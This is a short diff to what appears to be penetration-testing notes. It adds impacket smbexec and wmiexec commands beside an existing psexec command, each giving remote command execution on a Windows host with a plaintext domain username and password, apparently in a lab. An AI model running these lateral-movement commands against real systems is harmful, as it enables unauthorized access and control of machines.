@@ -26,4 +26,8 @@
 
 ```bash
 impacket-psexec kernel.local/aliakbari:p@ssword1@192.168.127.242
+
+impacket-smbexec kernel.local/aliakbari:p@ssword1@192.168.127.242
+
+impacket-wmiexec kernel.local/aliakbari:p@ssword1@192.168.127.242
 ```
